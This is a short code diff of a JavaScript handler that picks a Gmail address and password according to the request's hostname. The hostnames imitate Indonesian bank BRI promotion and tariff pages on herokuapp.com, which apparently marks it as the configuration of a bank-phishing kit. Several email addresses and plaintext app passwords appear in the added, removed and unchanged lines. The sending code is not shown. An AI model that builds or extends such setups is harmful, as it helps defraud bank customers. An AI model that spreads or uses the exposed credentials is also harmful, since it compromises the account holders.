@@ -12,18 +12,11 @@ export default function handler(req, res) {
         email = 'orbitorbit799@gmail.com';
         pass = 'ahghpmbdwokimqim'; 
 
-    } else if (url == 'bri-promo.herokuapp.com') {
-        
-        email = 'hibrahimshaleh@gmail.com';
-        pass = 'bfaawtyurzhbqjkl';
 
-    } else if(url == 'perubahantarif-bri.herokuapp.com'){
+    } else if(url == 'tarif-bri.herokuapp.com'){
         email = 'pooopss117@gmail.com';
         pass = 'teelhhgttgviupfp';
 
-    } else if(url == 'bri-pertarif.herokuapp.com'){
-        email = 'bbri58087@gmail.com';
-        pass = 'rngmokeomagmuhki';
 
     }
     else {
